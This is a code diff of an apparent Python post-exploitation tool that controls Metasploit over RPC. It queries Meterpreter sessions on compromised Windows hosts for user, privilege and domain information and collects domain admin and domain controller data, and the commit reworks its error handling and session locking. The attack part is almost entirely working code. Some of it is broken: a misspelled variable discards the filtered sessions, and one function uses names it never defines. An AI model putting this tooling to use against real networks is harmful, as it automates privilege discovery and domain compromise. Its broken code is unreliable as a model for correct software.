@@ -14,6 +14,8 @@ from termcolor import colored
 from netaddr import IPNetwork, AddrFormatError
 from subprocess import Popen, PIPE, CalledProcessError
 
+BUSY_SESSIONS = []
+
 def parse_args():
     # Create the arguments
     parser = argparse.ArgumentParser()
@@ -72,15 +74,14 @@ def get_local_ip(iface):
     return ip
 
 async def get_shell_info(CLIENT, sess_num):
-    err = None
     sysinfo_cmd = 'sysinfo'
     sysinfo_end_str = b'Meterpreter     : '
 
     sysinfo_output = await run_session_cmd(CLIENT, sess_num, sysinfo_cmd, sysinfo_end_str)
-    # Catch timeout
+    # Catch error
     if type(sysinfo_output) == str:
-        err = sysinfo_cmd
-        return (None, err)
+        return sysinfo_output
+
     else:
         sysinfo_utf8_out = sysinfo_output.decode('utf8')
         sysinfo_split = sysinfo_utf8_out.splitlines()
@@ -89,10 +90,9 @@ async def get_shell_info(CLIENT, sess_num):
     getuid_end_str = b'Server username:'
 
     getuid_output = await run_session_cmd(CLIENT, sess_num, getuid_cmd, getuid_end_str)
-    # Catch timeout
+    # Catch error
     if type(getuid_output) == str:
-        err = getuid_cmd
-        return (None, err)
+        return getuid_output
     else:
         getuid_utf8_out = getuid_output.decode('utf8')
         getuid = 'User            : '+getuid_utf8_out.split('Server username: ')[-1].strip().strip()
@@ -100,7 +100,7 @@ async def get_shell_info(CLIENT, sess_num):
     # We won't get here unless there's no errors
     shell_info_list = [getuid] + sysinfo_split
 
-    return (shell_info_list, err)
+    return shell_info_list
 
 def get_domain(shell_info):
     for l in shell_info:
@@ -124,8 +124,21 @@ def is_domain_joined(user_info, domain):
 
     return False
 
+def print_shell_data(shell_info, admin_shell, local_admin, sess_num_str):
+    print_info('New shell info')
+    for l in shell_info:
+        print('        '+l)
+    msg =  '''        Admin shell     : {}
+        Local admin     : {}
+        Session number  : {}'''.format( 
+                              admin_shell.decode('utf8'), 
+                              local_admin.decode('utf8'),
+                              sess_num_str)
+    print(msg)
+
 async def sess_first_check(CLIENT, session, sess_num):
     if b'first_check' not in session:
+        print_good('Session {} found, gathering shell info...'.format(str(sess_num)))
 
         # Give meterpeter chance to open
         await asyncio.sleep(2)
@@ -134,56 +147,43 @@ async def sess_first_check(CLIENT, session, sess_num):
         session[b'first_check'] = b'False'
         session[b'session_number'] = sess_num_str.encode()
 
-        shell_info, err = await get_shell_info(CLIENT, sess_num)
-        if err:
-            # err is the cmd it errored on or the msg
-            session[b'Error'] = err.encode()
+        shell_info = await get_shell_info(CLIENT, sess_num)
+        # Catch errors
+        if type(shell_info) == str:
+            session[b'error'] = shell_info.encode()
             return session
 
+        # returns either a string of the domain name or False
         domain = get_domain(shell_info)
+        if domain:
+            session[b'domain'] = domain.encode()
 
-        # 1st line of shell_info is username like WIN10\\dan
         domain_joined = is_domain_joined(shell_info[0], domain)
         if domain_joined == True:
             session[b'domain_joined'] = b'True'
         else:
             session[b'domain_joined'] = b'False'
 
-        if domain:
-            session[b'domain'] = domain.encode()
-        else:
-            domain = 'Not domain joined'
-
-        (admin_shell, local_admin), err = await is_admin(CLIENT, sess_num)
+        admin_shell, local_admin = await is_admin(CLIENT, sess_num)
         # Catch errors
-        if err:
-            session[b'Error'] = err
+        if type(admin_shell) == str:
+            session[b'error'] = admin_shell.encode()
             return session
 
         session[b'admin_shell'] = admin_shell
         session[b'local_admin'] = local_admin
 
-        print_good('Shell found')
-        for l in shell_info:
-            print('        '+l)
-        msg =  '''        Admin shell     : {}
-        Local admin     : {}
-        Session number  : {}'''.format( 
-                                  admin_shell.decode('utf8'), 
-                                  local_admin.decode('utf8'),
-                                  sess_num_str)
-        print(msg)
+        print_shell_data(shell_info, admin_shell, local_admin, sess_num_str)
 
     return session
 
 async def is_admin(CLIENT, sess_num):
-    err = None
     cmd = 'run post/windows/gather/win_privs'
-    output = await run_session_cmd(CLIENT, sess_num, cmd, None)
 
+    output = await run_session_cmd(CLIENT, sess_num, cmd, None)
     # Catch error
     if type(output) == str:
-        return (None, None), sess_num
+        return (output, None)
 
     if output:
         split_out = output.decode('utf8').splitlines()
@@ -194,10 +194,10 @@ async def is_admin(CLIENT, sess_num):
         user = user_info_list[5]
 
         # Byte string
-        return (str(admin_shell).encode(), str(local_admin).encode()), err
+        return (str(admin_shell).encode(), str(local_admin).encode())
 
     else:
-        return (b'ERROR', b'ERROR'), err
+        return (b'ERROR', b'ERROR')
 
 async def get_domain_controller(CLIENT, domain_data, sess_num):
     print_info('Getting domain controller...')
@@ -267,84 +267,125 @@ async def attack_with_sessions(CLIENT, sessions, domain_data):
 
         for s in sessions:
 
-            # Check for errored out sessions and ignore
-            if b'Error' in sessions[s]:
-                continue
-            
             # Get and print session info if first time we've checked the session
             sessions[s] = await sess_first_check(CLIENT, sessions[s], s)
-
-            # Check for errored out sessions and ignore
-            # We edited sessions[s] so we gotta use that instead of session
-            if b'Error' in sessions[s]:
-                continue
             
-            if b'Domain' in sessions[s]:
-                domain_data['domains'].append(sessions[s][b'Domain'])
+            # Update domain data
+            if b'domain' in sessions[s]:
+                domain_data['domains'].append(sessions[s][b'domain'])
 
             if domain_data['domain_admins'] == []:
                 domain_data = await get_domain_data(CLIENT, sessions[s], s, domain_data)
 
     return (sessions, domain_data)
 
-async def run_session_cmd(CLIENT, sess_num, cmd, end_str, timeout=10):
-    ''' Will only return a str if we failed to run a cmd'''
+def get_output(CLIENT, cmd, sess_num):
+    output = CLIENT.call('session.meterpreter_read', [str(sess_num)])
 
-    script_errors = [b'[-] post failed', b'error in script', b'operation failed', b'unknown command']
-    res = CLIENT.call('session.meterpreter_run_single', [str(sess_num), cmd])
+    # Everythings fine
+    if b'data' in output:
+        return output[b'data']
+
+    # Got an error from the CLIENT.call
+    elif b'error_message' in output:
+        decoded_err = output[b'error_message'].decode('utf8')
+        print_bad(error_msg.format(sess_num_str, decoded_err))
+        return decoded_err
+
+    # Some other error catchall
+    else:
+        return cmd
+
+def get_output_errors(output, counter, cmd, sess_num, timeout, sleep_secs):
+    script_errors = [b'[-] post failed', 
+                     b'error in script', 
+                     b'operation failed', 
+                     b'unknown command', 
+                     b'operation timed out']
+
+    # Got an error from output
+    if any(x in output.lower() for x in script_errors):
+        print_bad(('Command [{}] in session {} '
+                   'failed with error: {}'
+                   ).format(cmd, str(sess_num), output.decode('utf8')))
+        return cmd, counter
+
+    # If no terminating string specified just wait til timeout
+    if output == b'':
+        counter += sleep_secs
+        if counter > timeout:
+            print_bad('Command [{}] in session {} timed out'.format(cmd, str(sess_num)))
+            return 'timed out', counter
+
+    # No output but we haven't reached timeout yet
+    return output, counter
+
+async def run_session_cmd(CLIENT, sess_num, cmd, end_str, timeout=30):
+    ''' Will only return a str if we failed to run a cmd'''
+    global BUSY_SESSIONS
+
     error_msg = 'Error in session {}: {}'
     sess_num_str = str(sess_num)
+
+    print_info('Running [{}] on session {}'.format(cmd, str(sess_num)))
+
+    while sess_num in BUSY_SESSIONS:
+        await asyncio.sleep(.1)
+
+    BUSY_SESSIONS.append(sess_num)
+
+    res = CLIENT.call('session.meterpreter_run_single', [str(sess_num), cmd])
 
     if b'error_message' in res:
         err_msg = res[b'error_message'].decode('utf8')
         print_bad(error_msg.format(sess_num_str, err_msg))
         return err_msg
 
-    if res[b'result'] == b'success':
+    elif res[b'result'] == b'success':
 
         counter = 0
-        sleep_secs = 0.2 
+        sleep_secs = 0.5
+
         try:
             while True:
                 await asyncio.sleep(sleep_secs)
-                output = CLIENT.call('session.meterpreter_read', [str(sess_num)])
 
-                if b'data' in output:
-                    output = output[b'data']
-                else:
-                    decoded_err = output[b'error_message'].decode('utf8')
-                    print_bad(error_msg.format(sess_num_str, decoded_err))
-                    return decoded_err
-
-                # Output errored
-                if any(x in output.lower() for x in script_errors):
-                    print_bad(('Command <{}> in session {} '
-                               'failed with error: {}'
-                               ).format(cmd, str(sess_num), output.decode('utf8')))
+                output = get_output(CLIENT, cmd, sess_num)
+                # Error from meterpreter console
+                if type(output) == str:
+                    BUSY_SESSIONS.remove(sess_num)
                     return output
 
                 # Successfully completed
-                # Check if the ending string is in output or if script errored
-                elif end_str:
+                if end_str:
                     if end_str in output:
+                        BUSY_SESSIONS.remove(sess_num)
+                        return output
+                # If no end_str specified just return once we have any data
+                else:
+                    if len(output) > 0:
+                        BUSY_SESSIONS.remove(sess_num)
                         return output
 
-                # If no terminating string specified just wait 5m
-                elif output == b'':
-                    counter += sleep_secs
-                    # Set default wait time to 1m
-                    if counter > timeout:
-                        return cmd
-
-                else:
+                # Check for errors from cmd's output
+                output, counter = get_output_errors(output, counter, cmd, sess_num, timeout, sleep_secs)
+                # Error from cmd output including timeout
+                if type(output) == str:
+                    BUSY_SESSIONS.remove(sess_num)
                     return output
 
+        # This usually occurs when the session suddenly dies or user quits it
         except Exception as e:
-            err = 'exception likely due to abrupt death of session'
+            err = 'exception below likely due to abrupt death of session'
             print_bad(error_msg.format(sess_num_str, err))
+            print_bad('    '+str(e))
+            BUSY_SESSIONS.remove(sess_num)
             return err
+
+    # b'result' not in res, b'error_message' not in res, just catch everything else as an error
     else:
         print_bad(res[b'result'].decode('utf8'))
+        BUSY_SESSIONS.remove(sess_num)
         return cmd
     
 def get_perm_token(CLIENT):
@@ -354,27 +395,37 @@ def get_perm_token(CLIENT):
     CLIENT.token = '123'
     return CLIENT
 
+def filter_broken_sessions(updated_sessions):
+    ''' We remove 2 kinds of errored sessions: 1) timed out on sysinfo 2) shell died abruptly '''
+    unbroken_sessions = {}
+
+    for s in updated_sessions:
+        if b'error' in updated_sessions[s]:
+            # Session timed out on initial sysinfo cmd
+            if b'domain' not in updated_sessions[s]:
+                continue
+            # Session abruptly died
+            elif updated_sessions[s][b'error'] == b'exception below likely due to abrupt death of session':
+                continue
+
+        unbroken_sessions[s] = updated_sessions[s]
+
+    return unbroken_sessions
+
 def update_sessions(sessions, updated_sessions):
     ''' Four keys added after we process a new session: 
         first_check, domain_joined, local_admin, admin_shell 
         This function does not overwrite data from MSF
         it only adds previously known data to the MSF session'''
     if updated_sessions:
-        # s = session number
+        udpated_sessions = filter_broken_sessions(updated_sessions)
+
+        # s = session number, sessions[s] = session data dict
         for s in sessions:
             if s in updated_sessions:
                 for k in updated_sessions[s]:
                     if k not in sessions[s]:
                         sessions[s][k] = updated_sessions[s].get(k)
-
-    return sessions
-
-async def wait_for_session_info(CLIENT, sessions):
-    for s in sessions:
-        if sessions[s][b'info'] == b'':
-            await asyncio.sleep(1)
-            sessions = CLIENT.call('session.list')
-            break
 
     return sessions
 
@@ -384,7 +435,6 @@ async def check_for_sessions(CLIENT):
                    'domain_admins':[], 
                    'err':[]}
     updated_sessions = None
-    timed_out_sessions = []
     print_info('Waiting for Meterpreter shell')
 
     while True:
@@ -397,15 +447,8 @@ async def check_for_sessions(CLIENT):
 
         # Do stuff with the sessions
         updated_sessions, domain_data = await attack_with_sessions(CLIENT, sessions, domain_data)
-        
-        for s in updated_sessions:
-            if b'Error' in updated_sessions[s]:
-                if s not in timed_out_sessions:
-                    print_bad('Session {} died'.format(str(s)))
-                else:
-                    timed_out_sessions.append(s)
                 
-        await asyncio.sleep(1)
+        await asyncio.sleep(10)
 
 def main(args):
 
